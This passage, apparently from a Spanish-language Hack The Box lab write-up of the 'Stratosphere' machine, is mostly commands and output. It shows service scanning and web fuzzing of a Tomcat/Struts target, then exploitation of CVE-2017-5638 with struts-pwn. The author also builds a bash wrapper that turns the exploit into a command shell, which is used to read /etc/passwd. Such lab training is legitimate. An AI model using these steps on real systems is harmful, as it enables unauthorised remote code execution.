+SF:<span class="se">\n</span><span class="s2">")%r(X11Probe,49,"</span>HTTP/1<span class="se">\.</span>1<span class="se">\x</span>20400<span class="se">\x</span>20<span class="se">\r\n</span>Date:<span class="se">\x</span>20Tue,<span class="se">\x</span>2012<span class="se">\x</span>20Oct<span class="se">\</span>
+SF:x202021<span class="se">\x</span>2020:10:27<span class="se">\x</span>20GMT<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n\r\n</span><span class="s2">")%r(FourOhFo
+SF:urRequest,4F6,"</span>HTTP/1<span class="se">\.</span>1<span class="se">\x</span>20404<span class="se">\x</span>20<span class="se">\r\n</span>Content-Type:<span class="se">\x</span>20text/html<span class="p">;</span>chars
+SF:et<span class="o">=</span>utf-8<span class="se">\r\n</span>Content-Language:<span class="se">\x</span>20en<span class="se">\r\n</span>Content-Length:<span class="se">\x</span>201114<span class="se">\r\n</span>Date:
+SF:<span class="se">\x</span>20Tue,<span class="se">\x</span>2012<span class="se">\x</span>20Oct<span class="se">\x</span>202021<span class="se">\x</span>2020:10:28<span class="se">\x</span>20GMT<span class="se">\r\n</span>Connection:<span class="se">\x</span>20clos
+SF:e<span class="se">\r\n\r\n</span>&lt;<span class="o">!</span>doctype<span class="se">\x</span>20html&gt;&lt;html<span class="se">\x</span><span class="nv">20lang</span><span class="o">=</span><span class="se">\"</span>en<span class="se">\"</span><span class="o">&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;HTTP<span class="se">\x</span>20St
+SF:atus<span class="se">\x</span>20404<span class="se">\x</span>20<span class="se">\x</span>e2<span class="se">\x</span>80<span class="se">\x</span>93<span class="se">\x</span>20Not<span class="se">\x</span>20Found&lt;/title&gt;&lt;style<span class="se">\x</span><span class="nv">20type</span><span class="o">=</span><span class="se">\"</span>tex
+SF:t/css<span class="se">\"</span><span class="o">&gt;</span>h1<span class="se">\x</span>20<span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>color:white<span class="p">;</span>backgrou
+SF:nd-color:#525D76<span class="p">;</span>font-size:22px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20h2<span class="se">\x</span>20<span class="o">{</span>font-family:Tahoma,Arial,sa
+SF:ns-serif<span class="p">;</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span>font-size:16px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20h3<span class="se">\x</span>2
+SF:0<span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>color:white<span class="p">;</span>background-color:#525
+SF:D76<span class="p">;</span>font-size:14px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20body<span class="se">\x</span>20<span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>co
+SF:lor:black<span class="p">;</span>background-color:white<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20b<span class="se">\x</span>20<span class="o">{</span>font-family:Tahoma,Arial,sa
+SF:ns-serif<span class="p">;</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20p<span class="se">\x</span>20<span class="o">{</span>font-family:Ta
+SF:homa,Arial,sans-serif<span class="p">;</span>background:white<span class="p">;</span>color:black<span class="p">;</span>font-size:12px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20
+SF:a<span class="se">\x</span>20<span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20a<span class="se">\.</span>name<span class="se">\x</span>20<span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20<span class="se">\.</span>line<span class="se">\x</span>20<span class="o">{</span>height:1
+SF:px<span class="p">;</span>background-color:#525D76<span class="p">;</span>border:none<span class="p">;</span><span class="o">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;<span class="s2">");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port8080-TCP:V=7.92%I=7%D=10/12%Time=6165EA91%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,786,"</span>HTTP/1<span class="se">\.</span>1<span class="se">\x</span>20200<span class="se">\x</span>20<span class="se">\r\n</span>Accept-Ranges:<span class="se">\x</span>20bytes<span class="se">\r\n</span>ETag:
+SF:<span class="se">\x</span>20W/<span class="se">\"</span>1708-1519762495000<span class="se">\"\r\n</span>Last-Modified:<span class="se">\x</span>20Tue,<span class="se">\x</span>2027<span class="se">\x</span>20Feb<span class="se">\x</span>20
+SF:2018<span class="se">\x</span>2020:14:55<span class="se">\x</span>20GMT<span class="se">\r\n</span>Content-Type:<span class="se">\x</span>20text/html<span class="se">\r\n</span>Content-Length
+SF::<span class="se">\x</span>201708<span class="se">\r\n</span>Date:<span class="se">\x</span>20Tue,<span class="se">\x</span>2012<span class="se">\x</span>20Oct<span class="se">\x</span>202021<span class="se">\x</span>2020:10:27<span class="se">\x</span>20GMT<span class="se">\r\n</span>C
+SF:onnection:<span class="se">\x</span>20close<span class="se">\r\n\r\n</span>&lt;<span class="o">!</span>DOCTYPE<span class="se">\x</span>20html&gt;<span class="se">\n</span>&lt;html&gt;<span class="se">\n</span>&lt;<span class="nb">head</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20
+SF:<span class="se">\x</span>20<span class="se">\x</span>20&lt;meta<span class="se">\x</span><span class="nv">20charset</span><span class="o">=</span><span class="se">\"</span>utf-8<span class="se">\"</span>/&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;title&gt;Stratosphe
+SF:re&lt;/title&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;<span class="nb">link</span><span class="se">\x</span><span class="nv">20rel</span><span class="o">=</span><span class="se">\"</span>stylesheet<span class="se">\"\x</span><span class="nv">20type</span><span class="o">=</span><span class="se">\"</span>text/
+SF:css<span class="se">\"\x</span><span class="nv">20href</span><span class="o">=</span><span class="se">\"</span>main<span class="se">\.</span>css<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n</span>&lt;/head&gt;<span class="se">\n\n</span>&lt;body&gt;<span class="se">\n</span>&lt;div<span class="se">\x</span><span class="nv">20id</span><span class="o">=</span><span class="se">\"</span>backgroun
+SF:d<span class="se">\"</span><span class="o">&gt;</span>&lt;/div&gt;<span class="se">\n</span>&lt;header<span class="se">\x</span><span class="nv">20id</span><span class="o">=</span><span class="se">\"</span>main-header<span class="se">\"\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>hidden<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>2
+SF:0&lt;div<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>container<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;div<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>content-
+SF:wrap<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;p&gt;&lt;i<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>fa<span class="se">\x</span>20fa-diamond<span class="se">\"</span><span class="o">&gt;</span>&lt;/
+SF:i&gt;&lt;/p&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;nav&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20
+SF:&lt;a<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>btn<span class="se">\"\x</span><span class="nv">20href</span><span class="o">=</span><span class="se">\"</span>GettingStarted<span class="se">\.</span>html<span class="se">\"</span><span class="o">&gt;</span>Get<span class="se">\x</span>20started&lt;/a&gt;
+SF:<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;/nav&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;/div&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20&lt;/div
+SF:&gt;<span class="se">\n</span>&lt;/header&gt;<span class="se">\n\n</span>&lt;section<span class="se">\x</span><span class="nv">20id</span><span class="o">=</span><span class="se">\"</span>greeting<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20&lt;div<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>c
+SF:ontainer<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;div<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>content-wrap<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\</span>
+SF:x20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;h1&gt;Stratosphere&lt;br&gt;We<span class="se">\x</span>20protect<span class="se">\x</span>20your<span class="se">\x</span>20credit<span class="se">\.</span>&lt;/h
+SF:1&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;a<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>btn<span class="se">\"\x</span><span class="nv">20href</span><span class="o">=</span><span class="se">\"</span>GettingStarte
+SF:d<span class="se">\.</span>html<span class="se">\"</span><span class="o">&gt;</span>Get<span class="se">\x</span>20started<span class="se">\x</span>20now&lt;/a&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20&lt;p&gt;&lt;i<span class="se">\x</span>20c
+SF:lass<span class="o">=</span><span class="se">\"</span>ar<span class="s2">")%r(HTTPOptions,8A,"</span>HTTP/1<span class="se">\.</span>1<span class="se">\x</span>20200<span class="se">\x</span>20<span class="se">\r\n</span>Allow:<span class="se">\x</span>20GET,<span class="se">\x</span>2
+SF:0HEAD,<span class="se">\x</span>20POST,<span class="se">\x</span>20PUT,<span class="se">\x</span>20DELETE,<span class="se">\x</span>20OPTIONS<span class="se">\r\n</span>Content-Length:<span class="se">\x</span>200<span class="se">\r</span>
+SF:<span class="se">\n</span>Date:<span class="se">\x</span>20Tue,<span class="se">\x</span>2012<span class="se">\x</span>20Oct<span class="se">\x</span>202021<span class="se">\x</span>2020:10:27<span class="se">\x</span>20GMT<span class="se">\r\n</span>Connection:<span class="se">\</span>
+SF:x20close<span class="se">\r\n\r\n</span><span class="s2">")%r(RTSPRequest,49,"</span>HTTP/1<span class="se">\.</span>1<span class="se">\x</span>20400<span class="se">\x</span>20<span class="se">\r\n</span>Date:<span class="se">\x</span>20T
+SF:ue,<span class="se">\x</span>2012<span class="se">\x</span>20Oct<span class="se">\x</span>202021<span class="se">\x</span>2020:10:27<span class="se">\x</span>20GMT<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n</span>
+SF:<span class="se">\r\n</span><span class="s2">")%r(FourOhFourRequest,4F6,"</span>HTTP/1<span class="se">\.</span>1<span class="se">\x</span>20404<span class="se">\x</span>20<span class="se">\r\n</span>Content-Type:<span class="se">\x</span>
+SF:20text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="se">\r\n</span>Content-Language:<span class="se">\x</span>20en<span class="se">\r\n</span>Content-Length:
+SF:<span class="se">\x</span>201114<span class="se">\r\n</span>Date:<span class="se">\x</span>20Tue,<span class="se">\x</span>2012<span class="se">\x</span>20Oct<span class="se">\x</span>202021<span class="se">\x</span>2020:10:27<span class="se">\x</span>20GMT<span class="se">\r\n</span>Co
+SF:nnection:<span class="se">\x</span>20close<span class="se">\r\n\r\n</span>&lt;<span class="o">!</span>doctype<span class="se">\x</span>20html&gt;&lt;html<span class="se">\x</span><span class="nv">20lang</span><span class="o">=</span><span class="se">\"</span>en<span class="se">\"</span><span class="o">&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>
+SF:&lt;title&gt;HTTP<span class="se">\x</span>20Status<span class="se">\x</span>20404<span class="se">\x</span>20<span class="se">\x</span>e2<span class="se">\x</span>80<span class="se">\x</span>93<span class="se">\x</span>20Not<span class="se">\x</span>20Found&lt;/title&gt;&lt;st
+SF:yle<span class="se">\x</span><span class="nv">20type</span><span class="o">=</span><span class="se">\"</span>text/css<span class="se">\"</span><span class="o">&gt;</span>h1<span class="se">\x</span>20<span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>col
+SF:or:white<span class="p">;</span>background-color:#525D76<span class="p">;</span>font-size:22px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20h2<span class="se">\x</span>20<span class="o">{</span>font-famil
+SF:y:Tahoma,Arial,sans-serif<span class="p">;</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span>font-siz
+SF:e:16px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20h3<span class="se">\x</span>20<span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>color:white<span class="p">;</span>back
+SF:ground-color:#525D76<span class="p">;</span>font-size:14px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20body<span class="se">\x</span>20<span class="o">{</span>font-family:Tahoma,Ar
+SF:ial,sans-serif<span class="p">;</span>color:black<span class="p">;</span>background-color:white<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20b<span class="se">\x</span>20<span class="o">{</span>font-famil
+SF:y:Tahoma,Arial,sans-serif<span class="p">;</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20p<span class="se">\x</span>
+SF:20<span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span>background:white<span class="p">;</span>color:black<span class="p">;</span>fon
+SF:t-size:12px<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20a<span class="se">\x</span>20<span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20a<span class="se">\.</span>name<span class="se">\x</span>20<span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span><span class="se">\x</span>20<span class="se">\.</span>
+SF:line<span class="se">\x</span>20<span class="o">{</span>height:1px<span class="p">;</span>background-color:#525D76<span class="p">;</span>border:none<span class="p">;</span><span class="o">}</span>&lt;/style&gt;&lt;/hea
+SF:d&gt;&lt;body&gt;<span class="s2">");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.45 seconds
+</span></code></pre></div></div>
+
+<p>Vemos los puertos 80 y 8080 asociados al servicio HTTP, por lo que vamos a ver a lo que nos enfrentamos con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.64/
+http://10.10.10.64/ <span class="o">[</span>200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.64], Script, Title[Stratosphere]
+❯ whatweb http://10.10.10.64:8080/
+http://10.10.10.64:8080/ <span class="o">[</span>200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.64], Script, Title[Stratosphere]
+</code></pre></div></div>
+
+<p>No vemos nada interesante, así que vamos a ver el contenido web:</p>
+
+<p><img src="/assets/images/htb-stratosphere/stratosphere-web.png" alt=""></p>
+
+<p>Que tampoco vemos algo que nos de valor como atacantes, así que vamos a tratar de descubrir rutas dentro del servidor web:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 100 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>153 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.64/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.64/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000004889:   302        0 L      0 W        0 Ch        "manager"                                                       
+000013290:   302        0 L      0 W        0 Ch        "Monitoring"                                                    
+000022971:   400        0 L      0 W        0 Ch        "http%3A%2F%2Fwww"                                              
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 127.3097
+Processed Requests: 39673
+Filtered Requests: 39670
+Requests/sec.: 311.6257
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 100 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hw</span><span class="o">=</span>153 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.64:8080/FUZZ
+
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.64:8080/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000004889:   302        0 L      0 W        0 Ch        "manager"                                                       
+000013290:   302        0 L      0 W        0 Ch        "Monitoring"                                                    
+000022971:   400        0 L      0 W        0 Ch        "http%3A%2F%2Fwww"                                         
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 127.3097
+Processed Requests: 39673
+Filtered Requests: 39670
+Requests/sec.: 311.6257
+</span></code></pre></div></div>
+
+<p>Vemos los recursos <code class="language-plaintext highlighter-rouge">manager</code> y <code class="language-plaintext highlighter-rouge">Monitoring</code>, al tratar de checarlos, el recurso <code class="language-plaintext highlighter-rouge">manager</code> nos arroja un panel de login asociado a <strong>Apache Tomcat</strong> y las credenciales por defecto no funcionan. Para el recurso <code class="language-plaintext highlighter-rouge">Monitoring</code> vemos un panel de login y notamos algo extraño en la dirección URL:</p>
+
+<p><img src="/assets/images/htb-stratosphere/stratosphere-monitoring.png" alt=""></p>
+
+<p>Tenemos un archivo llamado <code class="language-plaintext highlighter-rouge">Welcome.action</code> con una extensión poco común; así que buscaremos un posible exploit relacionado con ese tipo de extensión.</p>
+
+<p><a href="https://github.com/mazen160/struts-pwn">struts-pwn</a></p>
+
+<p>Tenemos el recurso <strong><em>struts-pwn</em></strong> que es un exploit asociado a Apache Struts cuya vulnerabilidad se encuentra descrita en el CVE <em>CVE-2017-5638</em> y que nos permite la ejecución de comandos a nivel de sistema; así que vamos a descargarlo a nuestro directorio de trabajo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/mazen160/struts-pwn
+Clonando en <span class="s1">'struts-pwn'</span>...
+remote: Enumerating objects: 37, <span class="k">done</span><span class="nb">.</span>
+remote: Total 37 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 37
+Recibiendo objetos: 100% <span class="o">(</span>37/37<span class="o">)</span>, 8.92 KiB | 8.92 MiB/s, listo.
+Resolviendo deltas: 100% <span class="o">(</span>21/21<span class="o">)</span>, listo.
+</code></pre></div></div>
+
+<p>Y de acuerdo con el repositorio, debemos instalar primeramente los requerimientos que necesita el programa para funcionar y hay que tener en cuenta que está desarrollado en python3.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ pip3 <span class="nb">install</span> <span class="nt">-r</span> requirements.txt
+WARNING: The directory <span class="s1">'/root/.cache/pip'</span> or its parent directory is not owned or is not writable by the current user. The cache has been disabled. Check the permissions and owner of that directory. If executing pip with <span class="nb">sudo</span>, you may want <span class="nb">sudo</span><span class="s1">'s -H flag.
+Collecting argparse
+  Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
+Requirement already satisfied: requests in /usr/lib/python3/dist-packages (from -r requirements.txt (line 2)) (2.25.1)
+Installing collected packages: argparse
+Successfully installed argparse-1.4.0
+❯ 
+❯ python3 struts-pwn.py -h
+usage: struts-pwn.py [-h] [-u URL] [-l USEDLIST] [-c CMD] [--check]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -u URL, --url URL     Check a single URL.
+  -l USEDLIST, --list USEDLIST
+                        Check a list of URLs.
+  -c CMD, --cmd CMD     Command to execute. (Default: id)
+  --check               Check if a target is vulnerable.
+
+</span></code></pre></div></div>
+
+<p>Dentro del panel de ayuda de la herrmienta, se cuenta con un checker, así que vamos a validar si la máquina víctima es vulnerable:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 struts-pwn.py <span class="nt">-u</span> http://10.10.10.64:8080/Monitoring/example/Welcome.action <span class="nt">--check</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> URL: http://10.10.10.64:8080/Monitoring/example/Welcome.action
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Status: Vulnerable!
+<span class="o">[</span>%] Done.
+❯ python3 struts-pwn.py <span class="nt">-u</span> http://10.10.10.64/Monitoring/example/Welcome.action <span class="nt">--check</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> URL: http://10.10.10.64/Monitoring/example/Welcome.action
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Status: Vulnerable!
+<span class="o">[</span>%] Done.
+</code></pre></div></div>
+
+<p>Otra forma de validar si el sitio es vulnerable es mediante el uso de <code class="language-plaintext highlighter-rouge">nmap</code>, buscando si existe el CVE y agregando la ruta:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ locate cve2017-5638.nse
+/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse
+❯ nmap <span class="nt">--script</span> http-vuln-cve2017-5638 <span class="nt">--script-args</span> <span class="nv">path</span><span class="o">=</span>/Monitoring/ <span class="nt">-p8080</span> 10.10.10.64
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-12 16:07 CDT
+Nmap scan report <span class="k">for </span>10.10.10.64
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+| http-vuln-cve2017-5638: 
+|   VULNERABLE:
+|   Apache Struts Remote Code Execution Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-5638
+|       Apache Struts 2.3.5 - Struts 2.3.31 and Apache Struts 2.5 - Struts 2.5.10 are vulnerable to a Remote Code Execution
+|       vulnerability via the Content-Type header.
+|           
+|     Disclosure <span class="nb">date</span>: 2017-03-07
+|     References:
+|       https://cwiki.apache.org/confluence/display/WW/S2-045
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-5638
+|_      http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>0.98 seconds
+❯ nmap <span class="nt">--script</span> http-vuln-cve2017-5638 <span class="nt">--script-args</span> <span class="nv">path</span><span class="o">=</span>/Monitoring/ <span class="nt">-p80</span> 10.10.10.64
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-12 16:07 CDT
+Nmap scan report <span class="k">for </span>10.10.10.64
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-vuln-cve2017-5638: 
+|   VULNERABLE:
+|   Apache Struts Remote Code Execution Vulnerability
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-5638
+|       Apache Struts 2.3.5 - Struts 2.3.31 and Apache Struts 2.5 - Struts 2.5.10 are vulnerable to a Remote Code Execution
+|       vulnerability via the Content-Type header.
+|           
+|     Disclosure <span class="nb">date</span>: 2017-03-07
+|     References:
+|       https://cwiki.apache.org/confluence/display/WW/S2-045
+|       http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-5638
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>1.27 seconds
+</code></pre></div></div>
+
+<p>Vamos a validar si podemos ejecutar comandos a nivel de sistema y para evitar hacer para el puerto 80 y luego para el puerto 8080, vamos a tomar únicamente el puerto 8080:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 struts-pwn.py <span class="nt">-u</span> http://10.10.10.64/Monitoring/example/Welcome.action <span class="nt">-c</span> <span class="s2">"whoami"</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> URL: http://10.10.10.64/Monitoring/example/Welcome.action
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> CMD: <span class="nb">whoami</span>
+<span class="o">[!]</span> ChunkedEncodingError Error: Making another request to the url.
+Refer to: https://github.com/mazen160/struts-pwn/issues/8 <span class="k">for </span>help.
+EXCEPTION::::--&gt; <span class="o">(</span><span class="s2">"Connection broken: InvalidChunkLength(got length b'', 0 bytes read)"</span>, InvalidChunkLength<span class="o">(</span>got length b<span class="s1">''</span>, 0 bytes <span class="nb">read</span><span class="o">))</span>
+Note: Server Connection Closed Prematurely
+
+tomcat8
+
+<span class="o">[</span>%] Done.
+</code></pre></div></div>
+
+<p>Nos encontramos como el usuario <code class="language-plaintext highlighter-rouge">tomcat8</code>. Si tratamos de entablarnos una reverse shell, vemos que NO nos va a dejar; asi que vamos vamos a buscar recursos y otra forma de obtener acceso a la máquina. Asi que nos vamos a crear un script en bash para tener mejor movilidad a la hora de ejecutar comandos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="k">function </span>ctrl_c<span class="o">(){</span>
+        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[!] Saliendo..."</span>
+        <span class="nb">exit </span>1
+<span class="o">}</span>
+
+<span class="nb">trap </span>ctrl_c INT
+
+<span class="k">while</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$command</span><span class="s2">"</span> <span class="o">!=</span> <span class="s2">"exit"</span> <span class="o">]</span><span class="p">;</span><span class="k">do
+        </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$~</span><span class="s2"> "</span> <span class="o">&amp;&amp;</span> <span class="nb">read command
+        </span>python3 struts-pwn.py <span class="nt">-u</span> http://10.10.10.64:8080/Monitoring/example/Welcome.action <span class="nt">-c</span> <span class="s2">"""</span><span class="nv">$command</span><span class="s2">"""</span> | <span class="nb">grep</span> <span class="s2">"Prematurely"</span> <span class="nt">-A</span> 100 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nt">-E</span> <span class="s2">"Note:|Done"</span>
+<span class="k">done</span>
+</code></pre></div></div>
+
+<p>Vamos a checar los archivos que se encuentra en el directorio:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap ./shell_struts.sh
+<span class="nv">$~</span> <span class="nb">whoami
+
+</span>tomcat8
+
+<span class="nv">$~</span> <span class="nb">ls</span> <span class="nt">-l</span>
+
+total 16
+lrwxrwxrwx 1 root    root      12 Sep  3  2017 conf -&gt; /etc/tomcat8
+<span class="nt">-rw-r--r--</span> 1 root    root      68 Oct  2  2017 db_connect
+drwxr-xr-x 2 tomcat8 tomcat8 4096 Sep  3  2017 lib
+lrwxrwxrwx 1 root    root      17 Sep  3  2017 logs -&gt; ../../log/tomcat8
+drwxr-xr-x 2 root    root    4096 Oct 12 16:04 policy
+drwxrwxr-x 4 tomcat8 tomcat8 4096 Feb 10  2018 webapps
+lrwxrwxrwx 1 root    root      19 Sep  3  2017 work -&gt; ../../cache/tomcat8
+
+<span class="nv">$~</span> <span class="nb">cat</span> /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
